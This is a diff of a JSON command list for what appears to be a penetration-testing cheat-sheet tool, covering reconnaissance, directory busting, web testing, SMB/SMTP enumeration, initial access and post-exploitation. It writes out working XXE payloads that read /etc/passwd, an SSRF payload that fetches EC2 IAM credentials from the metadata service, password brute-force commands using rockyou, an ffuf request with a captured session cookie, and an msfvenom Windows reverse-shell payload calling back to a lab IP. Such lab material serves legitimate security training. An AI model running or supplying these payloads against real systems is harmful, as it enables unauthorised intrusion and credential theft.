@@ -1,29 +1,275 @@
 {
-  "Version":"0.0.0.1",
+  "Version": "0.0.0.1",
   "Categories": [
     {
-      "id":0,
-      "Name":"Dir Busting"
+      "id": 0,
+      "Name": "Passive Mapping"
     },
     {
-      "id":1,
-      "Name":"Web Scanning"
+      "id": 1,
+      "Name": "Application Analysis"
+    },
+    {
+      "id": 2,
+      "Name": "Web App Testing"
+    },
+    {
+      "id": 3,
+      "Name": "Interactive Mapping"
+    },
+    {
+      "id": 4,
+      "Name": "Webserver Scanning"
+    },
+    {
+      "id": 5,
+      "Name": "Vuln Scanning"
+    },
+    {
+      "id": 6,
+      "Name": "Subdomain"
+    },
+    {
+      "id": 7,
+      "Name": "Server Service Scanning"
+    },
+    {
+      "id": 8,
+      "Name": "Initial Access"
+    },
+    {
+      "id": 9,
+      "Name": "Post Exploitation"
     }
   ],
   "commands": [
     {
-      "Name":"dirb",
+      "Name": "Shodan",
       "Category": 0,
-      "Description":"Runs the clie dirbuster tool against a url with the provided wordlist",
-      "Command":"dirb http://yourtarget.com /usr/share/wordlists/yourwordlist"
+      "Description": "Search for company name and variations to look for nonstandard ports and outdated services",
+      "Command": "https://www.shodan.io/"
     },
     {
-      "Name":"Nikto",
-      "Category": 1,
-      "Description":"Runs the clie nikto tool against a url",
-      "Command":"nikto -h http://yourtarget.com"
+      "Name": "sub3num",
+      "Category": 0,
+      "Description": "Tool for subdomain enumeration https://github.com/saharshtapi/sub3num",
+      "Command": "./sub3num <target_domain>"
+    },
+    {
+      "Name": "subfinder",
+      "Category": 0,
+      "Description": "Tool for discovering subdomains https://github.com/projectdiscovery/subfinder",
+      "Command": "subfinder -d <target_domain>"
+    },
+    {
+      "Name": "reconng",
+      "Category": 0,
+      "Description": "Tool for reconnaissance https://github.com/lanmaster53/recon-ng",
+      "Command": "reconng"
+    },
+    {
+      "Name": "GrayHat Warfare",
+      "Category": 0,
+      "Description": "Look for cloud buckets by company names and variations with bucket keywords",
+      "Command": "https://grayhatwarfare.com/"
+    },        
+    {
+      "Name": "XXE",
+      "Category": 2,
+      "Description": "Test for XML External Entity vulnerabilities",
+      "Command": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <vulnfield>$ent</vulnfield>"
+    },
+    {
+      "Name": "XXE with SSRF",
+      "Category": 2,
+      "Description": "Retrieve data from internal EC2 instance using SSRF",
+      "Command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"
+    },
+    {
+      "Name": "XXE Without Full Control",
+      "Category": 2,
+      "Description": "Include XXE in vulnerable field without full document control",
+      "Command": "productId=1<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=2"
+    },
+    {
+      "Name": "XXE Embedded in Image",
+      "Category": 2,
+      "Description": "Embed XXE in an SVG image",
+      "Command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
+    },
+    {
+      "Name": "gobuster",
+      "Category": 3,
+      "Description": "Directory busting tool",
+      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt"
+    },
+    {
+      "Name": "ffuf",
+      "Category": 3,
+      "Description": "Directory busting with ffuf",
+      "Command": "ffuf -u http://hostmaster.ghost.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -mc 200,301,302"
+    },
+    {
+      "Name": "wfuzz",
+      "Category": 3,
+      "Description": "Directory busting with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ"
+    },
+    {
+      "Name": "nmap",
+      "Category": 3,
+      "Description": "Scan for open ports",
+      "Command": "nmap -p- --open 10.10.10.11"
+    },
+    {
+      "Name": "gobuster File",
+      "Category": 3,
+      "Description": "File busting with gobuster",
+      "Command": "gobuster dir -u http://target-site.com -w /path/to/wordlist.txt -x php,json"
+    },
+    {
+      "Name": "wfuzz File",
+      "Category": 3,
+      "Description": "File busting with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site.com/FUZZ.{php,json}"
+    },
+    {
+      "Name": "ffuf File",
+      "Category": 3,
+      "Description": "File busting with ffuf",
+      "Command": "ffuf -u http://target-site.com/FUZZ -w /path/to/wordlist.txt -e php,json -mc 200"
+    },
+    {
+      "Name": "hydra",
+      "Category": 4,
+      "Description": "Brute force login attempts",
+      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\""
+    },
+    {
+      "Name": "ffuf Brute",
+      "Category": 4,
+      "Description": "Brute force with ffuf",
+      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\""
+    },
+    {
+      "Name": "wfuzz Brute",
+      "Category": 4,
+      "Description": "Brute force with wfuzz",
+      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\""
+    },
+    {
+      "Name": "nikto",
+      "Category": 5,
+      "Description": "Vulnerability scanning with nikto",
+      "Command": "nikto -h http://targetip:targetport"
+    },
+    {
+      "Name": "nmap Vuln",
+      "Category": 5,
+      "Description": "Vulnerability scanning with nmap scripts",
+      "Command": "nmap --script-help=http* -v 10.10.10.11"
+    },
+    {
+      "Name": "wpscan",
+      "Category": 5,
+      "Description": "WordPress security scanner",
+      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/"
+    },
+    {
+      "Name": "ffuf Subdomain",
+      "Category": 6,
+      "Description": "Subdomain enumeration with ffuf",
+      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s"
+    },
+    {
+      "Name": "wfuzz Subdomain",
+      "Category": 6,
+      "Description": "Subdomain enumeration with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com"
+    },
+    {
+      "Name": "enum4linux",
+      "Category": 7,
+      "Description": "SMB enumeration",
+      "Command": "enum4linux -a 10.10.11.24"
+    },
+    {
+      "Name": "smbclient",
+      "Category": 7,
+      "Description": "List SMB shares",
+      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous"
+    },
+    {
+      "Name": "nmap SMB",
+      "Category": 7,
+      "Description": "SMB vulnerability scan",
+      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24"
+    },
+    {
+      "Name": "smbmap",
+      "Category": 7,
+      "Description": "SMB share mapping",
+      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\""
+    },
+    {
+      "Name": "medusa SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with medusa",
+      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F"
+    },
+    {
+      "Name": "hydra SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with hydra",
+      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb"
+    },
+    {
+      "Name": "ncrack SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with ncrack",
+      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16"
+    },
+    {
+      "Name": "nmap RPC",
+      "Category": 7,
+      "Description": "RPC enumeration with nmap",
+      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2"
+    },
+    {
+      "Name": "rpcclient",
+      "Category": 7,
+      "Description": "RPC client enumeration",
+      "Command": "rpcclient -U \"\" 10.10.11.24"
+    },
+    {
+      "Name": "smtp-user-enum",
+      "Category": 7,
+      "Description": "SMTP user enumeration",
+      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14"
+    },
+    {
+      "Name": "medusa SMTP",
+      "Category": 7,
+      "Description": "Brute force SMTP with medusa",
+      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25"
+    },
+    {
+      "Name": "dig",
+      "Category": 7,
+      "Description": "DNS record lookup",
+      "Command": "dig <domain> -t any"
+    },
+    {
+      "Name": "msfvenom Windows",
+      "Category": 8,
+      "Description": "Generate Windows reverse shell payload",
+      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx"
+    },
+    {
+      "Name": "chisel",
+      "Category": 9,
+      "Description": "Port forwarding with chisel",
+      "Command": "chisel server --port $PORT --proxy http://example.com"
     }
-
   ]
-
 }
